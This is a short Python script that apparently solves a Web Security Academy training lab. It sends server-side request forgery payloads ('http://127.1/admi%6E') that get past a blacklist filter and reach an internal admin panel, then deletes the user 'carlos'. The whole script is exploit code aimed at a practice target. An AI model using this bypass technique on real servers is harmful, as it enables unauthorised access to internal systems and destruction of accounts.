import requests
stock_url = 'https://ac021fbd1f70ede3c007f89200d80036.web-security-academy.net/product/stock/'

s = requests.Session()

ssrf_data = {
    'stockApi' : f'http://127.1/admi%6E'
}

stock_api_data = {
    'stockApi': 'http://127.1/admi%6E/delete?username=carlos'
}

resp = s.post(stock_url, ssrf_data)
print(resp.text)

resp = requests.post(stock_url, data=stock_api_data)
print(resp.text)
